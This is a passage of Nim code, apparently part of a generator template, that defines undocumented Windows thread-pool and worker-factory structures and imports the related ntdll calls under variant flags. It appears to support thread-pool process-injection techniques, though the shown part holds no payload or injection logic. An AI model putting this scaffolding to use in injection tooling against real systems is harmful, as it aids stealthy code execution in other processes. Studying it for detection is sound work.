    WorkOnBehalfTicket: ALPC_WORK_ON_BEHALF_TICKET
    RaceDll: PVOID
    Pool: PFULL_TP_POOL
    PoolObjectLinks: LIST_ENTRY
    Flags: INT32
    LongFunction: UINT32
    Persistent: UINT32
    UnusedPublic: UINT32
    Released: UINT32
    CleanupGroupReleased: UINT32
    InCleanupGroupCleanupList: UINT32
    UnusedPrivate: UINT32
    Padding_234: cint
    AllocCaller: TPP_CALLER
    ReleaseCaller: TPP_CALLER
    CallbackPriority: TP_CALLBACK_PRIORITY
    Padding_242: array[1, INT32]
  PTPP_CLEANUP_GROUP_MEMBER* = ptr TPP_CLEANUP_GROUP_MEMBER

#type
#  TPP_CLEANUP_GROUP_MEMBER_CALLBACK* = TPP_CLEANUP_GROUP_MEMBER_CALLBACK_PROC



type TPP_WORK_STATE* = object
    Exchange: INT32
    Insertable: UINT32
    PendingCallbackCount: UINT32

type FULL_TP_WORK* = object
    CleanupGroupMember: TPP_CLEANUP_GROUP_MEMBER
    Task: TP_TASK
    WorkState: TPP_WORK_STATE
    Padding_242: array[1, INT32]

type PFULL_TP_WORK* = ptr FULL_TP_WORK

const WORKER_FACTORY_RELEASE_WORKER* = 0x0001
const WORKER_FACTORY_WAIT* = 0x0002
const WORKER_FACTORY_SET_INFORMATION* = 0x0004
const WORKER_FACTORY_QUERY_INFORMATION* = 0x0008
const WORKER_FACTORY_READY_WORKER* = 0x0010
const WORKER_FACTORY_SHUTDOWN* = 0x0020
const WORKER_FACTORY_ALL_ACCESS* = STANDARD_RIGHTS_REQUIRED or WORKER_FACTORY_RELEASE_WORKER or WORKER_FACTORY_WAIT or WORKER_FACTORY_SET_INFORMATION or WORKER_FACTORY_QUERY_INFORMATION or WORKER_FACTORY_READY_WORKER or WORKER_FACTORY_SHUTDOWN

type SET_WORKERFACTORYINFOCLASS* = enum
    WorkerFactoryTimeout = 0
    WorkerFactoryRetryTimeout = 1
    WorkerFactoryIdleTimeout = 2
    WorkerFactoryBindingCount = 3
    WorkerFactoryThreadMinimum = 4
    WorkerFactoryThreadMaximum = 5
    WorkerFactoryPaused = 6
    WorkerFactoryAdjustThreadGoal = 8
    WorkerFactoryCallbackType = 9
    WorkerFactoryStackInformation = 10
    WorkerFactoryThreadBasePriority = 11
    WorkerFactoryTimeoutWaiters = 12
    WorkerFactoryFlags = 13
    WorkerFactoryThreadSoftMaximum = 14
    WorkerFactoryMaxInfoClass = 15 # Not implemented

type PSET_WORKERFACTORYINFOCLASS* = ptr SET_WORKERFACTORYINFOCLASS

type QUERY_WORKERFACTORYINFOCLASS* = enum
    WorkerFactoryBasicInformation2 = 7

type PQUERY_WORKERFACTORYINFOCLASS* = ptr QUERY_WORKERFACTORYINFOCLASS


proc NtQueryInformationWorkerFactory*(hWorkerFactory: HANDLE, WorkerFactoryInformationClass: QUERY_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.importc: "NtQueryInformationWorkerFactory", dynlib: "ntdll.dll".}
proc NtSetInformationWorkerFactory*(WorkerFactoryHandle: HANDLE, WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS, WorkerFactoryInformation: PVOID, WorkerFactoryInformationLength: ULONG): NTSTATUS {.importc: "NtSetInformationWorkerFactory", dynlib: "ntdll.dll".}
when defined(variant2):
    proc CreateThreadpoolWork*(pWorkCallback: PTP_WORK_CALLBACK, pWorkContext: PVOID, pCallbackEnviron: PTP_CALLBACK_ENVIRON): PFULL_TP_WORK {.importc: "CreateThreadpoolWork", dynlib: "kernel32.dll".}
when defined(variant3):
    proc ZwAssociateWaitCompletionPacket*(WaitCopmletionPacketHandle: HANDLE, IoCompletionHandle: HANDLE, TargetObjectHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR, AlreadySignaled: PBOOLEAN): NTSTATUS {.importc: "ZwAssociateWaitCompletionPacket", dynlib: "ntdll.dll".}
when defined(variant4):
    proc ZwSetIoCompletion*(IoCompletionHandle: HANDLE, KeyContext: PVOID, ApcContext: PVOID, IoStatus: NTSTATUS, IoStatusInformation: ULONG_PTR): NTSTATUS {.importc: "ZwSetIoCompletion", dynlib: "ntdll.dll".}

# import wcscmp from MSVCRT
proc wcscmp*(s1: PWSTR, s2: PWSTR): cint {.importc: "wcscmp", dynlib: "msvcrt.dll".}
# import realloc from MSVCRT
proc realloc*(inputPointer: PVOID, size: SIZE_T): PVOID {.importc: "realloc", dynlib: "msvcrt.dll".}

"""